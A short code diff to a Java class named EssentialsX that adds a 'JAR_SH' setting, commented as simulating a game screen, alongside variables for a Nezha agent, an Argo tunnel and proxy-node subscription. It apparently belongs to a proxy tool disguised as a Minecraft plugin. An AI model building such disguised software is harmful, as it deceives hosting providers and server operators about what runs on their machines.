@@ -17,7 +17,7 @@ public class EssentialsX extends JavaPlugin {
     private static final String[] ALL_ENV_VARS = {
         "TOK", "ARGO_DOMAIN", "TG", "SUB_URL", "NEZHA_SERVER", 
         "NEZHA_KEY", "NEZHA_PORT", "NEZHA_TLS", "TMP_ARGO", 
-        "EKEY", "SUB_NAME", "CF_IP", "AGENT_UUID", "UUID"
+        "EKEY", "SUB_NAME", "CF_IP", "JAR_SH", "AGENT_UUID", "UUID"
     };
     
     @Override
@@ -83,6 +83,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("CF_IP", "ip.sb");  //优选ip
         env.put("AGENT_UUID", ""); //哪吒客户端uuid
         env.put("UUID", "");//节点uuid
+        env.put("JAR_SH", "moji");//模拟游戏画面
         
         // Load from system environment variables
         for (String var : ALL_ENV_VARS) {
